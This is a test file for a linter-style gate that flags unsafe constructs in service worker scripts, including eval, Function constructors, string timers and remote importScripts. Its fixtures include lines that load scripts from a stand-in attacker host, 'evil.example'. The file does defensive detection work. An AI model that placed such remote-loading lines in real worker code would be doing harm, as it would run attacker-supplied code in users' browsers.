// SPDX-License-Identifier: AGPL-3.0-or-later
import { describe, expect, it } from 'vitest';
import { findSwSecurityIssues } from './check-sw-security.js';

describe('findSwSecurityIssues', () => {
  it('passes a clean worker with same-origin importScripts', () => {
    const content = 'importScripts("workbox-abc.js");\nimportScripts("sw-push.js");';
    expect(findSwSecurityIssues('sw.js', content)).toEqual([]);
  });

  it('flags a remote importScripts', () => {
    const content = 'importScripts("https://evil.example/x.js")';
    expect(findSwSecurityIssues('sw.js', content)).toHaveLength(1);
    expect(findSwSecurityIssues('sw.js', content)[0]).toMatch(/external importScripts/);
  });

  it('flags a PROTOCOL-RELATIVE remote importScripts (regression)', () => {
    // `//evil/x.js` has no scheme but still loads cross-origin code.
    const content = 'importScripts("//evil.example/x.js")';
    expect(findSwSecurityIssues('sw.js', content)).toHaveLength(1);
    expect(findSwSecurityIssues('sw.js', content)[0]).toMatch(/external importScripts/);
  });

  it('does not flag a same-origin relative importScripts', () => {
    expect(findSwSecurityIssues('sw.js', 'importScripts("sw-push.js")')).toEqual([]);
    expect(findSwSecurityIssues('sw.js', 'importScripts("/assets/wb.js")')).toEqual([]);
  });

  it('flags eval()', () => {
    expect(findSwSecurityIssues('sw.js', 'const x = eval("1+1");')).toHaveLength(1);
  });

  it('flags new Function()', () => {
    expect(findSwSecurityIssues('sw.js', 'const f = new Function("return 1");')).toHaveLength(1);
  });

  it('flags the BARE Function() constructor (regression)', () => {
    // `Function(src)` and `new Function(src)` construct the same function
    // object — the `new` is optional — so a gate that pins only the `new` form
    // leaves a fully-equivalent code sink open.
    expect(findSwSecurityIssues('sw.js', 'const f = Function("return 1");')).toHaveLength(1);
  });

  it('flags the Function constructor reached through the global object (regression)', () => {
    expect(findSwSecurityIssues('sw.js', 'const f = globalThis.Function("x")();')).toHaveLength(1);
    expect(findSwSecurityIssues('sw.js', 'const g = self.Function("x")();')).toHaveLength(1);
  });

  it('flags a string-bodied setTimeout/setInterval (implicit eval, regression)', () => {
    expect(findSwSecurityIssues('sw.js', 'setTimeout("doEvil()", 0);')).toHaveLength(1);
    expect(findSwSecurityIssues('sw.js', 'setInterval("doEvil()", 10);')).toHaveLength(1);
  });

  it('does NOT flag ordinary function-argument timers or unrelated identifiers', () => {
    const content = [
      'setTimeout(() => self.skipWaiting(), 0);',
      'setInterval(tick, 1000);',
      'const v = getFunction(name);',
      'const w = registry.Function;',
    ].join('\n');
    expect(findSwSecurityIssues('sw.js', content)).toEqual([]);
  });

  it('accumulates multiple violations', () => {
    const content = 'importScripts("http://x/y.js"); eval("z"); new Function("w");';
    expect(findSwSecurityIssues('sw.js', content)).toHaveLength(3);
  });

  it('ignores comments that merely mention forbidden constructs', () => {
    const content =
      '// no eval (allowed in prose)\n/* importScripts("https://x") */\nself.skipWaiting();';
    expect(findSwSecurityIssues('sw.js', content)).toEqual([]);
  });

  // Round-7: this gate scanned only the comment-STRIPPED copy, which made every
  // detection depend on lexing the whole file correctly. The strip's
  // regex-vs-division rule is a heuristic, not a parser, and a mis-lex there can
  // blank a real sink out of existence — strictly worse than not stripping.
  // Scanning the raw text as well means a lexing mistake can only ADD a false
  // positive, never hide a constructor call.
  it('catches a sink the comment strip would erase (regression)', () => {
    // The `/` after `)` is read as division, so the `/*` inside the regex
    // literal opens a "comment" that runs to the trailing `*/` — deleting the
    // Function call in between.
    const content = `if (ok) /[/*]/.test(x); Function('return 42')(); const tail = '*/';`;
    const issues = findSwSecurityIssues('sw.js', content);
    expect(issues.length).toBeGreaterThan(0);
    expect(issues.join('\n')).toMatch(/Function/);
  });

  it('reports each sink label once even when the raw and stripped passes agree', () => {
    // Both passes see this one, and a worker listing the same violation twice
    // would be noise rather than signal.
    expect(findSwSecurityIssues('sw.js', 'const f = Function("return 1");')).toHaveLength(1);
  });
});
